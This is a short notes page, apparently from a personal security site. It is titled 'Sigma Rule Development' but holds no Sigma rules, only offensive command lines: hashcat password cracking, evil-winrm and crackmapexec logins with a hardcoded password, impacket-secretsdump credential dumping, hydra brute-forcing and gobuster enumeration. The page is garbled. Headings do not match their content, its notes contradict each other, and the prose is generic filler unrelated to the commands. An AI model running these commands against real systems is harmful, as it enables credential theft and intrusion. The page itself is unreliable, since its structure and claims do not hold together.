---
TitleSEO: "Sigma Rule Development | ZureFX"
TitlePost: "Sigma Rule Development"
Author: "ZureFX"
Description: "Personal notes on Sigma Rule Development. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, privilege escalation, oscp, lateral movement, enumeration"
URL: "https://zurefx.github.io/notes/note-sigma-rule-development-656.html"
URL_IMAGES: ""
Date: "2025-09-03"
Tags: "Cheatsheet, Privilege Escalation, OSCP, Lateral Movement, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-sigma-rule-development-656"
Permalink: "/notes/note-sigma-rule-development-656.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Sudo Misconfiguration

### evil-winrm

> **Note:** SQL Injection was identified as the primary attack vector in this scenario.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.85.240.174 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.94.155.254 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## Subdomain Takeover

### WinRM

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.83.98
```

> **Note:** Sudo Misconfiguration was identified as the primary attack vector in this scenario.

## SUID Binary

### MongoDB

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.72.22 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.16.171.215/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.63.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.55.130.230 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1433,22,993 10.101.90.16 -oN scan.txt
evil-winrm -i 10.73.37.13 -u administrator -p 'P@ssw0rd!'
```

- `metasploit`
- `SSTI`
- `netcat`
- `hashcat`
- `CORS Misconfiguration`
